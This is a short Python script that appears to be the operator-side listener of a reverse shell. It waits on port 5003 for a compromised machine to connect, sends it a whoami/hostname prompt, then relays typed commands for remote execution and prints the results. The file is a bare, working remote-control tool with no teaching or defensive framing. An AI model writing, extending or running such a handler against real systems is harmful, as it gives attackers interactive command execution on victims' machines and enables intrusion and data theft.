import socket
from os import getenv


SERVER_HOST = getenv("SERVER_HOST", "0.0.0.0")
SERVER_PORT = getenv("SERVER_PORT", 5003)
BUFFER_SIZE = getenv("BUFFER_SIZE", 1024)

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen()
print("Listening on {}:{}...".format(SERVER_HOST, SERVER_PORT))

client_socket, client_address = s.accept()
print(f"Connection for {client_address[0]}:{client_address[1]} established!")

client_socket.send('echo "["$(whoami)"@"$(hostname|cut -d. -f1)" ?]$ "'.encode())
prompt = client_socket.recv(BUFFER_SIZE).decode()

while True:
    command = input(prompt)
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)

client_socket.close()
s.close()
